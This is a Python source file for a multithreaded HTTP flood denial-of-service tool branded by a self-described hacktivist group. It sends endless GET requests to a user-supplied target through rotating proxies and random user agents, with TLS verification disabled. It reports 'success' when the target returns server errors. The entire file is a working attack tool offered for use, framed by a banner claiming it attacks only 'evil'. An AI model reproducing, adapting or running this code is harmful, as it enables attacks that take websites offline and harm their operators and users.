import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import time
import random
import sys
import threading
import os

headers_useragents = []
R = '\033[31m'  # Aggressive/Alert/Caution/Warning/Failed
B = '\033[34m'  # Normal/Questioning
G = '\033[1;32m'  # Process Completed/Success
Y = '\033[32m'  # On Process/Processing/Executing/Deploying

# Load user-agents from file
def dict_headers():
    global headers_useragents
    with open("useragents.txt", "r") as f:
        useragents = f.read().splitlines()
        headers_useragents.extend(useragents)

dict_headers()

# Clear screen function
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# Intro animation
def intro():
    clear()
    message = f"""{B}
W E L C O M E   T O   H T T P F L O O D v . 2!
H A V E   F U N! (>_•)
    """
    for char in message:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.03)
    time.sleep(2)

clear()
intro()
clear()

print(f"""{B}
      ░▒▓████████▓▒░▒▓██████▓▒░▒▓████████▓▒░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░
      ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░
      ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░
      ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░
      ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░
      ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░
      ░▒▓████████▓▒░▒▓██████▓▒░  ░▒▓█▓▒░   ░▒▓██████▓▒░ ░▒▓█████████████▓▒░
{R}DDOS TOOLS OF EOTCW AND VULNSEC ARMY PH [HTTP-FLOOD METHOD V.2]
HTTPFLOOD VERSION2 MADE STRONGER WITH PROXIES AND MULTI-THREADING
WE HATE EVIL, WICKEDNESS, ABOMINATION, AND CRUELTY; WE HACK FOR GOD!
[!] WARNING: ONLY USE THIS TOOL AGAINST EVIL AND NOT FOR EVIL!!!
PRESS CTRL + C TO EXIT
""")

# Attack function
def attack(target, proxyfile, attktime):
    try:
        with open(proxyfile, "r") as p:
            proxies = p.read().split("\n")

        r = 0
        while True:
            r += 1
            headers = {'user-agent': random.choice(headers_useragents).strip()}
            proxy = random.choice(proxies).strip()
            proxcs = {'http': proxy, 'https': proxy}  # Select one proxy per request

            req = requests.get(target, headers=headers, proxies=proxcs, timeout=attktime, verify=False)

            if req.status_code >= 500:
                print(f"{G}[+] Target Website is down! DDoS attack successful!")
            elif req.status_code == 403:
                print(f"{R}[!] DDoS attack blocked!")
            elif 200 <= req.status_code < 500:
                print(f"{Y}[*] Attacking {target}, Sending 10000 Requests.")
            else:
                print(f"{R}Unexpected status code: {req.status_code}")

    except requests.exceptions.Timeout:
        print(f"{R}Request timed out (Timeout set to {attktime} sec)")
    except requests.exceptions.ConnectionError:
        print(f"{R}Connection error")
    except Exception as e:
        print(f"{R}Unexpected error: {e}")
    except KeyboardInterrupt:
        print(f"{R}Exiting.....")
        time.sleep(1)
        exit()

# Main function
def main(target, proxyfile, attktime, num_threads):
    print(f"{Y}[+] Preparing to Attack.....")
    time.sleep(1)

    for i in range(num_threads):  # Threading moved inside main()
        thread = threading.Thread(target=attack, args=(target, proxyfile, attktime))
        thread.start()

if __name__ == "__main__":
    target = input(f"{B}Enter the target: ")
    num_threads = int(input(f"{B}Amount of threads to use: "))
    attktime = int(input(f"{B}Set timeout for your attacks (sec): "))  # Ensure integer conversion
    proxyfile = input(f"{B}Enter the proxy file: ")

    if os.path.isfile(proxyfile):
        print(f"{G}[+] Success! Proxy file is found!")
        main(target, proxyfile, attktime, num_threads)
    else:
        print(f"{R}[!] ERROR: 404 file not found!!!")
        